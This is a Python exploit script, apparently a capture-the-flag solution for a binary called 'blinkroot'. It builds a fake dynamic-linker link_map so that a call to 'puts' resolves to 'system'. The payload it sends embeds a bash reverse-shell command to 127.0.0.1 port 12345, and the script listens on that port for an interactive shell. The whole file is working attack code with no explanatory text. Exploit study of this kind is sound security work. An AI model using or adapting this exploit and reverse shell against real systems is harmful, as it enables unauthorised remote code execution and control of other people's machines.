#!/usr/bin/env python
from sc_expwn import *

bin_file = './blinkroot_b872f15bde9878674eb8d46809a6c8564c7c1280'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]})
env.set_item('libc',    debug   = None, \
                        local   = None)
env.select()

#==========

binf = ELF(bin_file)
addr_gotplt         = binf.sep_section['.got.plt']

addr_data           = binf.symbols['data']
addr_fake_linkmap   = addr_data + 0x10

#==========

def attack(conn, **kwargs):
    CMD = ";bash -c 'bash -i >& /dev/tcp/127.0.0.1/12345 0>&1'"

    dl = DlRuntime.Delta(binf, base = 'read')
    dl.set_victim('puts')
    dl.resolve(addr_fake_linkmap, 'system', suffix = True)

    payload  = p(addr_gotplt - addr_data)
    payload += p64(addr_fake_linkmap)
    payload += dl.delta_payload[:8]
    payload += CMD
    payload += dl.delta_payload[8+len(CMD):]
    payload += '\x00'*(1024-len(payload))

    conn.send(payload)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()

    l = listen(12345)
    comn.run(attack)
    l.interactive()

#==========
